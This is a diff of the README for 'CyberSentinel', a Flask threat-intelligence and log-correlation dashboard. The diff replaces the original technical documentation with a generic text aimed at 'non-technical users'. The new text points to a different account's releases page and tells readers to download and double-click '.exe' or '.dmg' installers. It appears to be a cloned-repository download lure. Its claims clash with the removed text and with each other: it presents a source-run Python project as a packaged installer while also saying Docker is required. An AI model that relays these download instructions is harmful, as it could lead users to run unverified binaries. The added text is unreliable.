@@ -1,287 +1,76 @@
-# 🛡️ CyberSentinel
+# 🛡️ CyberSentinel - Monitor Threats Effortlessly
 
-Status overview:
+## 🚀 Getting Started
 
-- 📦 Latest release: [GitHub Releases](https://github.com/sr-857/CyberSentinel/releases)
-- 📄 License: [MIT](https://github.com/sr-857/CyberSentinel/blob/main/LICENSE)
-- 🌐 Live demo: https://sr-857.github.io/CyberSentinel
-- ✅ CI pipeline: https://github.com/sr-857/CyberSentinel/actions/workflows/ci.yml
-- 🔍 CodeQL scan: https://github.com/sr-857/CyberSentinel/actions/workflows/codeql.yml
-- 🐳 Docker image: https://hub.docker.com/r/sr857/cybersentinel
-- ⭐ Stars & community: https://github.com/sr-857/CyberSentinel/stargazers
+Welcome to CyberSentinel! This application provides a clear view of security threats through a simple dashboard. With its powerful features, you can monitor threat intelligence and parse logs effectively. 
 
-CyberSentinel is a production-ready threat intelligence and log correlation dashboard. It ingests IOCs from open threat feeds, parses SSH/Apache server logs, correlates log activity against known malicious indicators, and presents analysts with an actionable browser-based dashboard complete with KPI tiles and Chart.js visualisations.
+## 📥 Download CyberSentinel
 
-## 🛠️ System Requirements
+[![Download CyberSentinel](https://img.shields.io/badge/Download%20Now-Get%20CyberSentinel-blue)](https://github.com/VijaySurya1/CyberSentinel/releases)
 
-- Python ≥ 3.11
-- Docker ≥ 24 (for containerized deployment)
-- OS: Linux, macOS, or Windows (via WSL2 recommended)
-- Memory: ≥ 512 MB (2 GB recommended for container workloads)
-- Git + Make (optional) for developer tooling
+## 🌐 Overview
 
-## 🧱 Architecture Overview
+CyberSentinel is designed for non-technical users who want to enhance their security monitoring. The tool ingests threat intelligence, analyzes logs from SSH and Apache servers, and correlates Indicators of Compromise (IOCs). It then generates real-time alerts to keep you informed of potential threats.
 
-The high-contrast platform flow highlights:
+### 🛠️ Key Features
 
-- **Threat Intel (blue)** — AbuseIPDB + AlienVault OTX collectors with deduplication and confidence scoring.
-- **Log Ingestion (orange)** — Deterministic SSH/Apache parsing with regex capture groups.
-- **Correlation Engine (purple)** — Severity scoring that differentiates SSH brute force vs. web anomalies.
-- **Analytics Core (teal)** — Pandas-powered aggregation feeding KPI tiles, charts, and alert summaries.
-- **Analyst Dashboard (green)** — Chart.js visualization layer connected to the Flask REST API.
+- **Threat Intelligence**: Stay updated with the latest security threats.
+- **Log Analysis**: Easily parse and analyze logs from SSH and Apache.
+- **IOC Correlation**: Connect the dots between security events and threats.
+- **Real-Time Alerts**: Receive immediate notifications when issues arise.
+- **User-Friendly Dashboard**: Access all information in a clear, organized view.
 
-### Backend
-- **Flask API** exposes endpoints to fetch threat intel, parse logs, run IOC correlation, produce analytics, and retrieve alerts.
-- **Threat Feeds** integrate with AbuseIPDB and AlienVault OTX (extendable to custom sources).
-- **Log Parsing** supports SSH auth logs and Apache access logs.
-- **Correlation Engine** matches log IPs against known IOCs, generating severity-based alerts.
-- **SQLite Database** persists indicators, parsed log events, and alert history.
-- **Analytics Module** aggregates IOC matches, SSH activity trends, and web anomalies for charting.
+### 🔧 System Requirements
 
-### Frontend
-- Responsive dashboard for security analysts with real-time status updates.
-- Controls to fetch intel, parse logs, run correlation workflows, and auto-refresh analytics.
-- KPI tiles summarising event volumes and active alerts.
-- Chart.js visualisations for SSH failures over time, top offending IPs, Apache status mix, and alert severity.
-- Tables for Threat Intel, SSH failures, Apache access events, and Alerts.
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution with Docker support.
+- **Memory**: Minimum 4 GB RAM.
+- **Storage**: Minimum 500 MB available space.
+- **Docker**: Required for running the application. You can download Docker [here](https://www.docker.com/get-started).
 
-### Data Layer
-- `data/logs` contains realistic sample SSH and Apache logs.
-- `data/intel` persists the downloaded IOCs (mounted volume in Docker).
+### 📋 Installation Instructions
 
-## 🧠 Design Decisions
+1. **Visit the Releases Page**: Go to the following link to access the latest version of CyberSentinel:
+   [Download CyberSentinel](https://github.com/VijaySurya1/CyberSentinel/releases)
 
-- **SQLite for persistence** — Embedded, zero-ops database with ACID semantics ideal for single-node SOC demos and quick resets.
-- **Flask REST API** — Lightweight, composable routing with blueprints ready for Gunicorn deployment.
-- **Chart.js visualisations** — Straightforward chart primitives that render crisply in GitHub Pages demos.
-- **Threat intel normalisation** — Canonical indicator schema with source, first/last seen, and confidence fields for downstream enrichment.
-- **Correlation severity model** — SSH matches default to `high`, web anomalies as `medium`, with room to extend to rule-based scoring.
-- **Regex-driven log parsing** — Explicit, unit-tested patterns enabling deterministic extraction for security investigations.
+2. **Select the Latest Release**: On the Releases page, find the most recent version of the application.
 
-## ⚡ Quickstart
+3. **Download the Application**: Click on the appropriate file for your operating system. The file may be named something like `cybersentinel-v1.0.0.exe` for Windows or `cybersentinel-v1.0.0.dmg` for macOS.
 
-### One-command local install
+4. **Run the Application**: After downloading, locate the file in your downloads folder. Double-click the file to start the installation process.
 
-```bash
-./install.sh
-```
+5. **Follow On-Screen Instructions**: The setup wizard will guide you through the installation. Follow the prompts to complete the installation.
 
-The script provisions a local virtual environment, installs dependencies, initialises SQLite, and launches the Flask dev server.
+### 🔍 Usage Instructions
 
-### Live Demo / GitHub Pages Preview
-- Explore the static walkthrough at **https://sr-857.github.io/CyberSentinel** for an at-a-glance dashboard tour powered by sample data.
+Once CyberSentinel is installed, follow these steps to begin using the application:
 
-### Prerequisites
-- Docker & Docker Compose
-- AbuseIPDB + AlienVault OTX API keys (optional but recommended)
+1. **Open CyberSentinel**: Locate the application icon on your desktop or in your applications folder and double-click to open it.
 
-### Environment
-Copy the example environment file and edit as required:
+2. **Configure Settings**: Set up your security preferences by navigating to the settings menu. Here, you can adjust alert notifications and log sources.
 
-```bash
-cp backend/.env.example backend/.env
-# Set ABUSEIPDB_API_KEY and OTX_API_KEY if available
-```
+3. **Ingest Threat Intelligence**: Add your data sources to begin gathering threat information. You can manually input the data or configure it to pull from an online source.
 
-### Run with Docker Compose
+4. **Analyze Logs**: Use the dashboard to upload your SSH and Apache logs. The application will process this information quickly and display the results.
 
-```bash
-docker compose up --build
-```
+5. **Review Alerts**: Keep an eye on the alert section to monitor any real-time notifications about potential security threats.
 
-- Backend available at `http://localhost:5000`
-- Frontend dashboard at `http://localhost:8080`
+### 📊 Support and Documentation
 
-### Local Development (Backend)
+For additional help using CyberSentinel, consider reviewing the documentation included with your installation. The online community is also available for support and advice. You can refer to these resources for further assistance:
 
-```bash
-cd backend
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-python -m backend.db           # initialise SQLite schema (use --purge to reset)
-python -m backend.app          # launch Flask server (uses built-in dev server)
-```
+- [User Manual](https://github.com/VijaySurya1/CyberSentinel/wiki)
+- [GitHub Issues](https://github.com/VijaySurya1/CyberSentinel/issues)
 
-Then open `frontend/index.html` directly or serve via your preferred static server.
+### 📞 Contact Us
 
-## API Endpoints
+If you need personal assistance or have specific questions about the application, feel free to reach out. You can contact us through the issues page on GitHub, and we will respond as soon as possible.
 
-| Method | Endpoint                | Description                                         |
-| ------ | ----------------------- | --------------------------------------------------- |
-| GET    | `/health`               | Health check                                        |
-| GET    | `/api/intel`            | Retrieve stored IOCs                                |
-| GET/POST | `/api/intel/fetch`    | Pull intel from AbuseIPDB + OTX and persist         |
-| GET/POST | `/api/logs/parse`     | Parse SSH + Apache logs and store events            |
-| GET    | `/api/logs`             | Retrieve parsed log events (filter with `source`)   |
-| GET/POST | `/api/correlation/run`| Correlate logs with IOCs and create alerts          |
-| GET/POST | `/api/correlate`      | Alias for `/api/correlation/run`                    |
-| GET    | `/api/alerts`           | Retrieve generated alerts                           |
-| GET    | `/api/analytics/summary`| Aggregated KPIs/charts data for the dashboard       |
-| GET/POST | `/api/workflow/refresh`| One-click intel → logs → correlation pipeline run |
+## 🔗 Additional Resources
 
-### OpenAPI Specification
+For a deeper understanding of cybersecurity and threat intelligence, you might want to look into the following topics:
 
-- Browse the minimal contract at [`docs/api/openapi.yaml`](docs/api/openapi.yaml) or import into Swagger UI/Postman for contract-first demos.
+- **Log Analysis Best Practices**: Learn how to effectively handle and analyze log data.
+- **Understanding IOCs**: Familiarize yourself with Indicators of Compromise and their importance in security.
+- **Docker Basics**: A guide to getting started with Docker if you're new to it.
 
-## Dashboard Preview
-
-- Primary interactions: **Fetch Intel → Parse Logs → Run Correlation → Workflow Refresh**.
-- Chart.js canvases highlight SSH failures over time, alert severity mix, and top offending IPs.
-- Alerts surface IOC matches with severity scoring, timestamps, and contextual metadata for triage.
-- Responsive analyst workspace with sidebar metrics, live status messaging, and workflow walkthrough.
-- Accessibility-conscious controls: keyboard focus states, ARIA-live updates, and disabled-state management during long-running tasks.
-
-## 🎯 Recruiter Walkthrough
-
-Looking to demo CyberSentinel in under five minutes? Follow this script:
-
-1. **Set the stage (30s)** — “CyberSentinel emulates a Tier-1/Tier-2 SOC workflow: ingest intel, parse logs, correlate IOCs, and deliver analyst-ready visuals.”
-2. **Show the data sources (60s)** — Open `docs/RELEASE_NOTES_TEMPLATE.md` or `README` to highlight intel feeds (AbuseIPDB, OTX) and sample logs in `data/logs/`.
-3. **Run the pipeline (120s)** — In a terminal, execute:
-   ```bash
-   python -m backend.app  # or docker compose up --build
-   ```
-   Visit `http://localhost:5000` (or `8080` via Docker) and click **Fetch Intel → Parse Logs → Run Correlation**.
-4. **Explain the dashboard (90s)** — Walk through KPI tiles, charts (trends, top IPs, status mix, severity), and the tables showing raw intel/logs/alerts.
-5. **Close with impact (30s)** — Emphasise automation: reusable intel collectors, deterministic parsing, and a workflow refresh endpoint that chains the entire pipeline.
-
-Talking points:
-- Built with Flask + Chart.js, deployable via Docker + Gunicorn.
-- Release automation, semantic versioning, and security-conscious defaults (.env handling, .gitignore, API key practices).
-- Extensible architecture: add feeds, logs, or correlation rules without rewriting the core.
-
-## Why CyberSentinel Matters
-- **Demonstrates security engineering depth** across data ingestion, parsing, correlation, analytics, and UI storytelling.
-- **Showcases production-minded operations** with Docker deployment, release automation, and a GitHub Pages preview that mirrors analyst workflows.
-- **Highlights portfolio-ready polish**: live badges, architecture diagram, and recruiter guidance make the project immediately legible to hiring managers.
-- **Invites collaboration** through clearly scoped contribution issues and sample data for rapid onboarding.
-
-## 🚨 SOC Scenario Demo
-
-**Scenario: SSH brute force escalation**
-
-1. Threat intel collectors ingest a suspicious IP (`203.0.113.7`) flagged by AbuseIPDB with high confidence.
-2. SSH parser detects 40 failed logins against privileged accounts within five minutes.
-3. Correlation engine scores a **Critical** alert, persisting evidence and severity rationale.
-4. Analytics layer spikes alert severity counts, surfacing the IOC in KPI tiles and Chart.js breakdowns.
-5. Analyst uses the dashboard to confirm malicious behaviour and trigger next-step response (ticketing, firewall block, etc.).
-
-## Security Notes
-- Use API keys via environment variables—never commit them.
-- Logs and intel volumes are mounted read-only/read-write to prevent tampering.
-- CORS is enabled for the static frontend; enforce origin restrictions when deploying.
-- SQLite is sufficient for MVP; migrate to managed SQL for multi-user deployments.
-- Ensure TLS termination in production (e.g., reverse proxy with HTTPS).
-
-## 🚀 Future Enhancements
-1. Add user authentication and RBAC for dashboard access.
-2. Enrich alerts with GeoIP/ASN data and MITRE ATT&CK mappings.
-3. Support additional log sources (e.g., Sysmon, firewall logs, cloud trail).
-4. Implement scheduled background jobs/APScheduler for continuous intel ingestion.
-5. Integrate with ticketing systems for automated alert escalation and reporting.
-
-## 📁 Folder Structure
-
-```
-CyberSentinel/
-├── backend/
-│   ├── __init__.py
-│   ├── analytics.py
-│   ├── app.py
-│   ├── correlation.py
-│   ├── db.py
-│   ├── intel_feeds.py
-│   ├── log_parser.py
-│   └── requirements.txt
-├── data/
-│   ├── intel/
-│   └── logs/
-├── docs/
-│   ├── api/openapi.yaml
-│   ├── images/
-│   ├── index.html
-│   └── releases/
-├── frontend/
-│   ├── dashboard.js
-│   ├── index.html
-│   └── styles.css
-├── tests/
-│   ├── __init__.py
-│   ├── test_analytics.py
-│   ├── test_correlation.py
-│   └── test_log_parser.py
-├── install.sh
-├── CHANGELOG.md
-├── Dockerfile
-├── docker-compose.yml
-└── README.md
-```
-
-## ✅ Quality & Testing
-
-- **Unit tests** live in `tests/` and validate log parsing, IOC correlation, and analytics aggregation.
-- **CI pipeline** executes linting, `py_compile`, and `pytest` on every push/pr.
-- **CodeQL security scanning** ensures static analysis coverage across the Python backend.
-
-## 🗺️ Roadmap
-- [ ] Webhook alert notifications ([#1](https://github.com/sr-857/CyberSentinel/issues/1))
-- [ ] CI smoke tests ([#2](https://github.com/sr-857/CyberSentinel/issues/2))
-- [ ] Role-based dashboard access
-- [ ] Scheduled IOC ingestion
-
-## 📅 Milestone Plan
-
-Public GitHub milestones to pin next-phase commitments:
-
-- **v1.1.0 — Alert Webhooks**: outbound Slack/Teams/email webhook integrations.
-- **v1.2.0 — Scheduled IOC Ingestion**: APScheduler-based background collectors.
-- **v1.3.0 — Role-Based Access**: analyst vs. admin dashboard modes with authentication.
-- **v1.4.0 — Agent-based Log Collection**: lightweight endpoint agent streaming logs to CyberSentinel.
-
-Track milestone burndown from **Issues → Milestones** to communicate delivery cadence.
-
-## 📝 GitHub Publishing Checklist
-- `gh repo edit sr-857/CyberSentinel --description "🛡️ CyberSentinel — Threat Intel + Log Correlation Dashboard…"` to set the tagline and SEO topics (`cybersecurity`, `threat-intelligence`, `soc-automation`, `flask`, `python`, `log-analysis`, `ioc-correlation`, `chartjs`, `docker`, `sqlite`, `security-analytics`).
-- Tag the release: `git tag -a v1.0.0 -m "CyberSentinel v1.0.0 — Initial analyst-ready release"` then `git push origin v1.0.0`.
-- Publish notes via `gh release create v1.0.0 --title "CyberSentinel v1.0.0" --notes-file docs/releases/v1.0.0.md`.
-- Upload the banner designed in `docs/banner_concept.md` to polish the repository header.
-- Pin the “Quick Demo for Recruiters” snippet near the top of the README or project description for instant context.
-
-## 🐳 Docker Image Publishing
-
-```
-docker build -t sr857/cybersentinel:latest .
-docker login -u sr857
-docker push sr857/cybersentinel:latest
-```
-
-Once pushed, the Docker Hub badge above will reflect pull counts automatically.
-
-## 🗒️ CHANGELOG
-
-All releases are tracked in [`CHANGELOG.md`](CHANGELOG.md) using Keep a Changelog formatting.
-
-## ⚖️ MIT License
-
-```
-Copyright (c) 2025 CyberSentinel
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
+Thank you for choosing CyberSentinel. Together, we can strengthen your security posture!
